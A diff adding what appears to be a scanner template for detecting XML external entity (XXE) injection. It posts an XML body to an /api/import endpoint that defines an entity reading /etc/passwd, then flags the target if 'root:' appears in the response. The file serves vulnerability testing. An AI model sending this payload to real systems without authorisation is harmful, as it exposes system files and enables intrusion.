@@ -1,0 +1,16 @@
+id: xxe-injection
+info:
+  name: XXE Injection
+  author: project-c
+  severity: high
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/import"
+    headers:
+      Content-Type: application/xml
+    body: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><request><user>&xxe;</user></request>"
+    matchers:
+      - type: word
+        words:
+          - "root:"
